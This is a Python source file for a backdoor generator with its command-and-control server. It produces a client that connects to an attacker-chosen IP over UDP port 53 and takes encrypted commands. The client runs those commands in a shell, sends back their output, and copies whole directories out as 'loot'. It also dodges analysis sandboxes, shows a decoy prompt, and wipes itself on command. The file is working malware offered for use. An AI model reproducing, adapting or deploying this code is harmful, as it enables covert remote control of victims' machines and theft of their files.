#!/usr/bin/python3
import argparse
import sys  
import socket
import signal
import os
import blessed
import time
from cryptography.fernet import Fernet


backdoor_template = """
import socket
import subprocess
import threading
import time
import sys
import os
import psutil
import multiprocessing
from cryptography.fernet import Fernet

def wipe():
    for i in range(5):
        open(sys.argv[0], "wb").write(os.urandom(os.path.getsize(sys.argv[0])))
    open(sys.argv[0], "wb").write(b"\\x00" * os.path.getsize(sys.argv[0]))
    os.remove(sys.argv[0])

def false_payload():
    wipe()
    print(f"Hello {input('What is you name?')}")

if multiprocessing.cpu_count() < 3:
    false_payload()
    sys.exit()

elif (time.time() - psutil.boot_time()) < 500:
    false_payload()
    sys.exit()

elif (psutil.virtual_memory().total/1000000000) < 4:
    false_payload()
    sys.exit()


class crypt:
    def decrypt(message):
        global keys
        for key in keys[::-1]:
            f = Fernet(bytes(key, "utf-8"))
            message = f.decrypt(message)
        return message

    def encrypt(message):
        global keys
        for key in keys:
            f = Fernet(bytes(key, "utf-8"))
            message = f.encrypt(message)
        return message 

def exec(process,tpconn,dpconn):
    for line in process.stdout:
        curtime = time.time()
        tpconn.send(curtime)
        dpconn.send(line)


def update_data(data_conn):
    global _temp_output, curtime
    _temp_output = []
    while True:
        try:
            _temp_output.append(data_conn.recv())
        except:
            break
        curtime = time.time()

keys = |KEYS_HERE|

addr = ('|IP_HERE|', 53)
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(addr)
s.sendto(b"hello", addr)
new_keys = s.recvfrom(100000)[0].decode()
for key in keys[::-1]:
    f = Fernet(bytes(key, "utf-8"))
    new_keys = f.decrypt(new_keys)
keys = new_keys.decode().split("|||")
if sys.platform == "linux":
    system = subprocess.Popen("bash", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
elif "win" in sys.platform:
    system = subprocess.Popen("powershell", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE)

while True:
    try:
        command = crypt.decrypt(s.recvfrom(1200000)[0]) + b'\\n'
        if command == b"|KILL_SEQUENCE|\\n":
            wipe()
            sys.exit()
        if command.startswith(b"|DOWNLOAD|"):
            s.sendto(crypt.encrypt(b"|FILE_DOWNLOAD|"), addr)
            path_to_download = command.split(b'|DOWNLOAD|')[1].strip()
            files_to_download = []
            for (root,dirs,files) in os.walk(path_to_download, topdown=True):
                for file in files:
                    files_to_download.append(os.path.join(root, file).decode('latin-1'))
            if os.path.isfile(path_to_download):
                files_to_download = [path_to_download.decode('latin-1')]    

            for file in files_to_download:
                with open(file, 'rb') as file_handle:
                    while True:
                        _file_buffer = file_handle.read(2048)
                        if not _file_buffer:
                            break
                        template = b"|FILE_DOWNLOAD|" + bytes(file, 'latin-1') + b"|FILE_DOWNLOAD|" + b"|SIZE|" + bytes(str(os.path.getsize(file)), "latin-1") + b"|SIZE|\\n"
                        template += _file_buffer
                        s.sendto(crypt.encrypt(template), addr)
                        time.sleep(0.5) 

                    time.sleep(0.5)
                    s.sendto(crypt.encrypt(b"|FILE_DOWNLOAD_COMPLETE|"), addr)
                    time.sleep(0.2)
            s.sendto(crypt.encrypt(b"DATA_STREAM_END"), addr)
            continue    

        system.stdin.write(command)
        system.stdin.flush()
        time_pconn, time_conn = multiprocessing.Pipe()
        data_pconn, data_conn = multiprocessing.Pipe()
        
        execute_command = multiprocessing.Process(target=exec, args=(system,time_pconn,data_pconn))
        execute_command.start()
        curtime = time.time()
        threading.Thread(target=update_data, args=(data_conn,)).start()
        while True:
            if time.time() - curtime > 2:
                execute_command.terminate()
                s.sendto(crypt.encrypt(b''.join(_temp_output)), addr)
                time.sleep(0.5)
                s.sendto(crypt.encrypt(b"DATA_STREAM_END"), addr)
                break
    except Exception as e:
        s.sendto(crypt.encrypt(b"DATA_STREAM_END"), addr)


"""

class utilities:
    def log(msg, level):
        global bt
        level_map = {
            "debug": f"{bt.grey}[*]{msg}{bt.normal}",
            "info": f"{bt.white}[i]{msg}{bt.normal}",
            "success": f"{bt.green}[+]{msg}{bt.normal}",
            "error": f"{bt.red}[-]{msg}{bt.normal}"
        }
        print(level_map[level])

    def get_args():
        global args
        parser = argparse.ArgumentParser()
        parser.add_argument('--li', help='IP the server will run on.', required=True)
        parser.add_argument('-o', '--output', help='Where the backdoor will be saved.', default='backdoor.py')
        parser.add_argument('-a', '--amount-of-keys', help='How many keys will be used to encrypt the traffic. (more keys = bigger packet)', default=5, type=int)
        args = parser.parse_args()

    def exit_gracefully(*_):
        utilities.log("Exiting", "success")
        sys.exit(0)


def server():
    global args, keys
    class crypt:
        def decrypt(message):
            global keys
            for key in keys[::-1]:
                f = Fernet(bytes(key, "utf-8"))
                message = f.decrypt(message)
            return message      
        def encrypt(message):
            global keys
            message = bytes(message, "utf-8")
            for key in keys:
                f = Fernet(bytes(key, "utf-8"))
                message = f.encrypt(message)
            return message

    og_keys = []
    for i in range(args.amount_of_keys):
        og_keys.append(Fernet.generate_key().decode())
    
    backdoor = backdoor_template.replace('|IP_HERE|', args.li).replace('|KEYS_HERE|', str(og_keys))

    open(args.output, "w").write(backdoor)
    utilities.log(f"Bakcdoor generated at:{args.output}", "success")

    new_keys = []
    for i in range(args.amount_of_keys):
        new_keys.append(Fernet.generate_key().decode())

    ssock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ssock.bind((args.li, 53))
    while True:
        data = ssock.recvfrom(120)
        addr = data[1]
        utilities.log(f"New connection from:{addr[0]}:{addr[1]}", "info")

        time.sleep(1)
        keys = og_keys
        ssock.sendto(crypt.encrypt('|||'.join(new_keys)), addr)
        keys = new_keys

        utilities.log("|KILL_SEQUENCE|  --> kill client", "info")
        utilities.log("|DOWNLOAD| <file> --> Downloads files from the target computer", "info")
        while True:
            command = input("$")
            ssock.sendto((crypt.encrypt(command)), addr)
            if command == "|KILL_SEQUENCE|":
                utilities.log("Kill sequence sent successfully.", "success")
                sys.exit()

            output = crypt.decrypt(ssock.recvfrom(1200000)[0])
            if output.startswith(b"|FILE_DOWNLOAD|"):
                utilities.log("Starting file download...", "success")
                downloaded = 0
                _past_file = ""
                while True:
                    output = crypt.decrypt(ssock.recvfrom(1200000)[0])
                    if output == b"|FILE_DOWNLOAD_COMPLETE|":
                        continue
                    elif output == b"DATA_STREAM_END":
                        break
                    file_name = output.split(b"\n")[0].split(b"|FILE_DOWNLOAD|")[1].decode('latin-1')
                    if _past_file != file_name:
                        downloaded = 0
                        print()
                    _past_file = file_name
                    file_size = int(output.split(b"\n")[0].split(b"|SIZE|")[1].decode('latin-1'))
                    _file_buffer = b'\n'.join(output.split(b"\n")[1:])
                    downloaded += len(_file_buffer)
                    print(f"{bt.blue}[i]File:{file_name} Progress:{downloaded}/{file_size}{bt.normal}", end="\r")
                    file_path = list(os.path.splitdrive(file_name))
                    file_path[0] = "loot"
                    file_path = '/'.join(file_path)
                    file_path = file_path.replace("//", "/")
                    os.makedirs(os.path.dirname(file_path), exist_ok=True)
                    if os.path.isfile(file_path):
                        file_handle = open(file_path, "ab")
                        file_handle.write(_file_buffer)
                        file_handle.close()
                    else:
                        file_handle = open(file_path, "wb")
                        file_handle.write(_file_buffer)
                        file_handle.close()
                    _file_buffer = ""
                    file_name = ""
                    output = ""
                print()
                utilities.log("File download complete!", "success")
                continue
            else:
                print(output.decode('latin-1'))

            _data_stream_end = crypt.decrypt(ssock.recvfrom(1200000)[0]).decode('latin-1')
            if _data_stream_end.strip() == "DATA_STREAM_END":
                pass
            else:
                utilities.log("Invalid end of stream! Connection might be unstable.", "error")


def main():
    global bt
    
    bt = blessed.Terminal()
    signal.signal(signal.SIGINT, utilities.exit_gracefully)
    server()


if __name__ == "__main__":
    utilities.get_args()
    main()
